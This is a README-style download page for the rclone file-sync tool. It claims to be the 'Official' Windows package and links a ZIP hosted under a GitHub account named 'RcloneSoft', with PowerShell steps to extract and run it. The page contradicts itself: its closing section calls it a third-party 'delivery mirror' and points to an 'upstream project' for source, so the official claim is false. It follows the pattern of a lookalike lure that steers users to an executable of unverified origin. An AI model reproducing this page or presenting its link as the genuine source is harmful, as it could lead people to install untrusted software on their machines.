# rclone — File Synchronization & Backup

Official rclone Windows package reference for file synchronization, cloud storage transfers, and backup workflows.

## Download

[Download rclone v1.75.2 for Windows x64](https://github.com/RcloneSoft/rclone-download/releases/latest/download/rclone-v1.75.2-windows-amd64.zip)

The ZIP contains `rclone.exe` and the accompanying documentation. It is a portable Windows build: extract it and run `rclone.exe` from PowerShell or Command Prompt.

## What rclone does

`rclone` is a command-line file management tool for Windows. It connects local folders, network shares, and cloud storage through one consistent interface, so you can move and manage data without relying on a separate desktop client for every service.

- Synchronizes files and directories between local storage and cloud providers
- Creates backup copies with transfers, checks, and resumable operations
- Supports many cloud and storage backends through one command-line tool
- Provides filtering, encryption, checksums, retries, and scheduled automation

Typical uses include:

- Keeping a local work folder synchronized with cloud storage
- Moving data directly from one cloud provider to another
- Creating repeatable backups with exclusions and filters
- Running transfers from PowerShell, scripts, or Windows Task Scheduler

## Quick start

```powershell
Expand-Archive .\rclone-v1.75.2-windows-amd64.zip -DestinationPath .
cd .\rclone-v1.75.2-windows-amd64
.\rclone.exe version
.\rclone.exe config
```

Create a copy after configuring a remote:

```powershell
.\rclone.exe copy "C:\Users\Public\Documents" "remote:backups/documents" --progress
```

## License and attribution

rclone is an open-source project. This repository provides a package reference and GitHub-hosted delivery mirror for the RcloneSoft profile. See the upstream project for license and source details.
